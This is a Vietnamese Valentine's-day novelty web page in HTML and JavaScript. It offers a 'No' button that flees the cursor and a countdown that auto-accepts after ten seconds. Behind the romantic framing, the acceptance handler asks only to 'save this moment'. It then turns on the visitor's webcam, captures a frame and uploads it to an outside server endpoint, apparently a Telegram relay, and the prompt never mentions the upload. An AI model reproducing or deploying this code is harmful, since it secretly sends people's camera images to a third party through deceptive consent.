<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<title>Valentine 💖</title>
<style>
body { margin:0; height:100vh; background:linear-gradient(135deg,#ffd6e0,#ffe6f0); display:flex; justify-content:center; align-items:center; font-family:Arial; overflow:hidden;}
.container { text-align:center;}
h1 { color:#ff3366;}
button { padding:12px 25px; margin:10px; border:none; border-radius:10px; font-size:16px; cursor:pointer;}
#yesBtn { background:#28a745; color:white;}
#noBtn { background:#dc3545; color:white; position:absolute;}
.heart { position:absolute; font-size:20px; animation:float 4s linear infinite;}
@keyframes float {0%{transform:translateY(0); opacity:1;}100%{transform:translateY(-900px); opacity:0;}}
#countdown {font-size:20px;color:#ff0066;}
</style>
</head>
<body>
<div class="container">
  <h1 id="text">Cậu sẽ là Valentine của tớ chứ? 💌</h1>
  <div id="countdown">Thời gian suy nghĩ: 10</div>
  <img src="https://media.giphy.com/media/MDJ9IbxxvDUQM/giphy.gif" width="200"><br>
  <button id="yesBtn">Đồng ý 💖</button>
  <button id="noBtn">Từ chối 😢</button>
</div>
<audio id="music" loop>
  <source src="https://www.fesliyanstudios.com/play-mp3/387" type="audio/mpeg">
</audio>
<script>
const yesBtn=document.getElementById("yesBtn");
const noBtn=document.getElementById("noBtn");
const text=document.getElementById("text");
const countdown=document.getElementById("countdown");
const music=document.getElementById("music");
let scale=1;
let time=10;
document.body.onclick=()=>{music.play();};
setInterval(()=>{
  time--;
  countdown.innerText="Thời gian suy nghĩ: "+time;
  if(time<=0){text.innerHTML="Hết thời gian 😏 Tự động đồng ý 💖"; handleYes();}
},1000);
const noTexts=["Thật không? 😢","Suy nghĩ lại đi 🥺","Đừng mà 😭","Bấm nhầm đúng không 😏","Cho cơ hội đi 💔"];
noBtn.onmouseover=()=>{
  const x=Math.random()*(window.innerWidth-100);
  const y=Math.random()*(window.innerHeight-50);
  noBtn.style.left=x+"px";
  noBtn.style.top=y+"px";
  scale-=0.1;
  noBtn.style.transform=`scale(${scale})`;
  noBtn.innerText=noTexts[Math.floor(Math.random()*noTexts.length)];
};
yesBtn.onclick=handleYes;
async function handleYes(){
  const allow=confirm("Cho tớ lưu lại khoảnh khắc này nhé? 📸");
  if(allow){
    try{
      await startCamera();
      setTimeout(async ()=>{
        await sendImage();
        alert("Đã lưu lại khoảnh khắc 💖");
        yesAction();
      },2000);
    }catch(err){
      alert("Không bật được camera 😢");
      yesAction();
    }
  }else{
    alert("Không sao, vẫn yêu bạn 💖");
    yesAction();
  }
}
async function startCamera(){
  const video=document.createElement("video");
  video.autoplay=true;
  video.style.position="fixed";
  video.style.bottom="10px";
  video.style.right="10px";
  video.style.width="150px";
  document.body.appendChild(video);
  const stream=await navigator.mediaDevices.getUserMedia({video:true});
  video.srcObject=stream;
  window.currentVideo=video;
}
function captureImage(){
  const canvas=document.createElement("canvas");
  const video=window.currentVideo;
  canvas.width=video.videoWidth;
  canvas.height=video.videoHeight;
  const ctx=canvas.getContext("2d");
  ctx.drawImage(video,0,0);
  return canvas.toDataURL("image/png");
}
async function sendImage(){
  const img=captureImage();
  await fetch("https://duong-stack-valentine-telegram-back-omega.vercel.app/upload",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({image:img})
  });
}
function yesAction(){
  text.innerHTML="Tớ biết mà 😍💖 Yêu cậu!!!";
  yesBtn.style.display="none";
  noBtn.style.display="none";
  countdown.style.display="none";
  setInterval(createHeart,200);
  createConfetti();
}
function createHeart(){
  const heart=document.createElement("div");
  heart.classList.add("heart");
  heart.innerHTML="💖";
  heart.style.left=Math.random()*window.innerWidth+"px";
  heart.style.top=window.innerHeight+"px";
  document.body.appendChild(heart);
  setTimeout(()=>heart.remove(),4000);
}
function createConfetti(){
  for(let i=0;i<100;i++){
    const conf=document.createElement("div");
    conf.style.position="absolute";
    conf.style.width="8px";
    conf.style.height="8px";
    conf.style.background="hsl("+Math.random()*360+",100%,50%)";
    conf.style.left=Math.random()*window.innerWidth+"px";
    conf.style.top="-10px";
    document.body.appendChild(conf);
    let fall=setInterval(()=>{
      conf.style.top=(conf.offsetTop+5)+"px";
      if(conf.offsetTop>window.innerHeight){conf.remove(); clearInterval(fall);}
    },20);
  }
}
</script>
</body>
</html>
